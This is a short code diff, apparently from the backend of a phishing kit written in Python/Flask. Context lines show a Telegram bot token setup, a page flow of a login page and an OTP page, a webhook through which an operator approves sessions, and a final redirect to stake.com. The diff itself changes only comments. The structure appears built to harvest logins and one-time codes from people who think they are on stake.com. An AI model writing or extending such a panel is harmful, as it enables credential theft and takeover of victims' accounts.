@@ -20,7 +20,7 @@ if not BOT_TOKEN or not CHAT_ID:
 
 SESSION_STATUS = {}
 
-# ✅ ONLY CHANGE: THANK YOU goes to stake.com
+# ✅ UPDATED (thank you goes to stake.com)
 PAGES = [
     {"emoji": "🔐", "text": "LOGIN1", "page": "index.html"},
     {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
@@ -138,7 +138,7 @@ def webhook():
 
         if session_id in SESSION_STATUS:
 
-            # ✅ HANDLE BOTH INTERNAL + EXTERNAL LINKS
+            # ✅ HANDLE EXTERNAL URL (stake.com)
             if page.startswith("http"):
                 redirect_url = page
             else:
@@ -154,7 +154,7 @@ def webhook():
 
 
 # ======================
-# STATUS (ALREADY FIXED LOOP)
+# FRONTEND STATUS CHECK (FIXED)
 # ======================
 @app.route("/status/<session_id>")
 def status(session_id):
@@ -166,7 +166,7 @@ def status(session_id):
     if session["approved"]:
         redirect_url = session["redirect_url"]
 
-        # 🔥 prevents infinite loop
+        # 🔥 RESET AFTER FIRST USE (prevents loop)
         session["approved"] = False
         session["redirect_url"] = None
 
